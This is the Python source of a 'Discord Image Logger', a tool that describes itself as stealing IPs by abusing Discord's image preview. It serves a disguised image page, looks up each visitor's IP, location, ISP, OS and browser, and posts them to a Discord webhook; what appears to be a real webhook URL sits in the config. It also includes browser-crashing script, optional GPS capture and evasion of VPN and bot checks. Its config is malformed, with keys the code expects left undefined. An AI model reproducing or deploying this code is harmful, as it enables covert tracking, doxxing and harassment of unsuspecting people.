                # Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "https://discord.com/api/webhooks/1445066689782743082/CiTZxFEPT-LWbwVoawMNmttsUHXpIdHCT8fPoPwk_D0d-khkzSNyWKkHCojsUFReF8S4":
    "data:image/jpeg;base64,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": 
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
